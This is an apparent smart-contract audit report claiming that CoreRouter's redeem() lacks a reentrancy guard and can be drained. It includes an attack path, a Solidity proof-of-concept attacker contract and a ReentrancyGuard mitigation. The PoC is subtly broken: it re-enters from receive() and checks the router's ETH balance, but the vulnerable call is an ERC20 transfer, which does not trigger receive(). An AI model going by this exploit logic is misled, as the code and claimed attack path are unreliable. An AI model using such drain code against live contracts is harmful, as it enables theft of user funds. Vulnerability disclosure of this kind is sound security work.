# Missing Reentrancy Guard in redeem() Function Allows Funds Drain via Reentrant Call

### Summary

The redeem() function in the CoreRouter contract lacks a reentrancy guard. Since external calls (e.g., IERC20.transfer) are made before critical state updates, a malicious contract can re-enter the function and drain funds, bypassing balance checks.



### Root Cause

The function performs an external call to transfer tokens to the caller before updating internal state, while not being protected by a nonReentrant modifier or equivalent locking mechanism.


```solidity
IERC20(_token).transfer(msg.sender, expectedUnderlying);
// state update only happens AFTER this
```

### Internal Pre-conditions

lendStorage.totalInvestment[msg.sender][_lToken] >= _amount



### External Pre-conditions

msg.sender is a contract with a fallback or receive function that can trigger a reentrant call to redeem().

Sufficient liquidity is available for redemption.

The user's position appears valid at the time of the initial call.

### Attack Path

Attacker supplies collateral and receives lTokens.

Attacker calls redeem().

During IERC20.transfer, the attacker's contract reenters redeem() (before state is updated).

Since totalInvestment is not yet updated, the second call passes the same checks.

Repeat recursively until all available funds are drained.

### Impact

Complete drain of the contract’s funds if reentrant redemption is not prevented.

Potential insolvency of the lending system.

Loss of user and protocol funds.

### PoC

```solidity
contract ReenterAttack {
    CoreRouter public router;
    address public lToken;

    constructor(CoreRouter _router, address _lToken) {
        router = _router;
        lToken = _lToken;
    }

    function attack() external {
        router.redeem(1 ether, payable(lToken));
    }

    receive() external payable {
        // Reenter during transfer before state is updated
        if (address(router).balance > 0) {
            router.redeem(1 ether, payable(lToken));
        }
    }
}

```

### Mitigation

Import and apply OpenZeppelin’s ReentrancyGuard:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract CoreRouter is ReentrancyGuard {
```
Protect the function:

```solidity
function redeem(uint256 _amount, address payable _lToken) external nonReentrant returns (uint256) {
    ...
}
```
Optionally, move all state updates before external calls if possible.
